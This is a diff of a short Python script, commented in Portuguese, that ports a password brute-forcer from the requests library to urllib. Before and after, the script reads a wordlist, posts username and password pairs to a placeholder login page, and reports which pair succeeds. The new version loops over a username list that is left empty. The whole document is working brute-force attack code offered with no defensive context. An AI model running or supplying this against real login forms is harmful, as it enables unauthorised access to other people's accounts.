@@ -1,25 +1,26 @@
-import requests
+import urllib.parse
+import urllib.request
 
-# Define as informações do site alvo
-url = "https://exemplo.com/login"
-username_field = "username"
-password_field = "password"
+wordlist = "insira o nome da lsita aqui"+".txt"
 
-# Lê a lista de senhas do arquivo txt
-with open("wordlist.txt", "r") as f:
-    passwords = f.read().splitlines()
+url = 'http://www.exemplo.com/login.php' # URL da página de login
+usernames = [''] # Lista de usuários
+with open(wordlist, 'r') as f:
+    passwords = [line.strip() for line in f.readlines()] # Lista de senhas
 
-# Faz uma requisição HTTP para cada senha da lista
-for password in passwords:
-    # Define as credenciais para a requisição
-    data = {username_field: "seu_nome_de_usuario", password_field: password}
+for username in usernames:
+    for password in passwords:
+        values = {'username': username, 'password': password} # Dados de login
+        data = urllib.parse.urlencode(values).encode('utf-8') # Codifica os dados em formato de bytes
 
-    # Faz a requisição HTTP
-    response = requests.post(url, data=data)
+        # Faz a requisição de login
+        req = urllib.request.Request(url, data)
+        response = urllib.request.urlopen(req)
+        html = response.read().decode('utf-8')
 
-    # Verifica se o login foi bem-sucedido
-    if "Bem-vindo" in response.text:
-        print(f"Login bem-sucedido com a senha {password}")
-        break
-    else:
-        print(f"Senha incorreta: {password}")
+        # Verifica se o login foi bem sucedido
+        if 'Login bem sucedido' in html:
+            print(f'Login bem sucedido com usuário "{username}" e senha "{password}"')
+            break # Sai do loop interno se o login foi bem sucedido
+        else:
+            print(f'Login falhou com usuário "{username}" e senha "{password}"')
